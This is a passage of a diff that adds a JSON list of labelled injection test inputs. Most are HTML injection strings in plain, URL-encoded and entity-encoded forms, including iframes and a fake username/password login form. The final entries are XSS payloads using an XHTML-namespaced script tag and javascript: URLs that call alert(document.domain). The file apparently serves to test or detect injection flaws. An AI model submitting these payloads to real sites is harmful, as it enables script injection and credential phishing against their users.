+        "category": "HTML"
+    },
+    {
+        "inputField": "<b>HTML</b>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h1>HTML</h1><!--",
+        "category": "HTML"
+    },
+    {
+        "inputField": "qq<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "qq<h1>HTML</h1>qq",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%3Ch1%3EHTML%3C%2Fh1%3E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ch1%253EHTML%253C%252Fh1%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "&lt;h1&gt;HTML&lt;/h1&gt;",
+        "category": "HTML"
+    },
+    {
+        "inputField": "&amp;lt;h1&amp;gt;HTML&amp;lt;/h1&amp;gt;",
+        "category": "HTML"
+    },
+    {
+        "inputField": "&#60;h1&#62;HTML&#60;/h1&#62;",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe src=\"https://www.google.com\" title=\"test\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "123<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<h1>HTML</h1>123",
+        "category": "HTML"
+    },
+    {
+        "inputField": "123<h1>HTML</h1>123",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ch1%253EHTML%253C%252Fh1%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe id=\"if1\" src=\"https://www.google.com\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<iframe id=\"if2\" src=\"https://www.google.com\"></iframe>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>HTML</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>HTML</h1>>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<<h1>html</h1>>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ch1%253EHTML%253C%252Fh1%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<div>HTML</div>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%3Ci%3Ehtml%3C%2Fi%3E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ci%253Ehtml%253C%252Fi%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<style>h1 {color:red;}</style><h1>This is a heading</h1>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<textarea id=\"HTML\" name=\"HTML\" rows=\"4\" cols=\"50\">Html injected</textarea>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<head><base href=\"https://www.google.com\" target=\"_blank\"></head>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<span style=\"color:blue;font-weight:bold\">html</span>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<abbr title=\"HTML\">HTML</abbr>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<acronym title=\"Armour Infosec\">AI</acronym>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<address>address,address</address>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<article><h2>Armour Infosec</h2></article>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<audio controls><source src=\"demo.ogg\" type=\"audio/ogg\"><source src=\"demo.mp3\" type=\"audio/mpeg\"></audio>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<bdi>Html</bdi>injection",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<bdo dir=\"rtl\">HTML html</bdo>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<blockquote cite=\"http://google.com\">HTML Injection</blockquote>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<body><h1>HTML html</h1></body>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "Html<br>line breaks<br>injection",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<button type=\"button\">Click Me!</button>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<canvas id=\"myCanvas\">draw htmli</canvas>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<caption>Html</caption>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<cite>Html Html</cite>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<code>Html</code>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<colgroup><col span=\"2\" style=\"background-color:red\"></colgroup>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<data value=\"21053\">test html</data>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<datalist id=\"html\"><option value=\"html\"></datalist>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dl><dt>Html</dt></dl>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dt>Html</dt>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dd>Html</dd>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<del>Html</del>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<ins>Html</ins>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<details><summary>HTML</summary><p>html html</p></details>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dfn>HTML</dfn>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dialog open>Html</dialog>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<dialog close></dialog>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<em>Html</em>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<embed type=\"text/html\" src=\"index.html\" width=\"500\" height=\"200\">",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<fieldset><legend>hello:</legend><label for=\"fname\">First name:</label><input type=\"text\"id=\"fname\"name=\"fname\"><br><br><inputtype=\"submit\" value=\"Submit\"></fieldset>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<figure>Html</figure>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<figcaption>Html Html</figcaption>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<footer>HTML html</footer>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<form method=\"GET\">Username: <input type=\"text\" name=\"username\" value=\"\" /> <br />Password: <input type=\"password\" name=\"passwd\" value=\"\" /> <br /><input type=\"submit\" name=\"submit\" value=\"login\" /></form>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<form method=\"POST\">Username: <input type=\"text\" name=\"username\" value=\"\" /> <br />Password: <input type=\"password\" name=\"passwd\" value=\"\" /> <br /><input type=\"submit\" name=\"submit\" value=\"login\" /></form>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<head><title>html</title></head>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<header>HTML html</header>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<hr>html<hr>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<img src=\"index.jpg\" alt=\"Girl in a jacket\" width=\"500\" height=\"600\">",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<input type=\"text\" id=\"name\" name=\"name\">",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<ins>red</ins>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<kbd>Ctrl</kbd>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "label for=\"html\">HTML</label><br>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<legend>Html</legend>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<li>Html</li>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<main>Html</main>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<map name=\"workmap\">Html</map>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<meter id=\"html\" value=\"2\" min=\"0\" max=\"10\">2 out of 10</meter>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<nav>Html</nav>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<noscript>Sorry, your browser does not support Html</noscript>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<ol>Html</ol>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<optgroup label=\"Html\"></optgroup>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<option value=\"Html>Html</option>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<pre>Html</pre>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<progress id=\"html\" value=\"32\" max=\"100\"> 32% </progress>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<q>Html Html</q>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<s>Only 50 tickets left</s>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<samp>File not found</samp>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<section>HTML</section>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<select name=\"cars\" id=\"cars\"></select>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<small>HTML rocks</small>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<strong>Html</strong>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<sub>Html</sub>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<summary>Html</summary>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<sup>Html</sup>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<svg width=\"100\" height=\"100\"><circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"green\" stroke-width=\"4\" fill=\"yellow\" /></svg>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<table><th>HTML</th><th>HTML</th></table>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<time>10:10</time>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<time datetime=\"2008-02-14 20:00\">HTML</time>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<ul>html</ul>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<var>Html</var>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<video width=\"320\" height=\"240\" controls></video>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<wbr>HTML html<wbr>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<div>HTML</div>",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%3Ci%3Ehtml%3C%2Fi%3E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "%253Ci%253Ehtml%253C%252Fi%253E",
+        "category": "HTML"
+    },
+    {
+        "inputField": "<body style=\"background-color:red\">",
+        "category": "HTML"
+    },
+    {
+    	  "inputField": "<a:script xmlns:a='http://www.w3.org/1999/xhtml'>alert(document.domain)</a:script>",
+    	  "category": "XML"
+    },
+    {
+    	  "inputField": "<Button href='javascript://%0aalert(document.domain)'>XSS</Button>\njavascript://%0dalert() \njavascript:/**/%0aalert()",
+    	  "category": "Java"
+    }
+
+]
+    
+
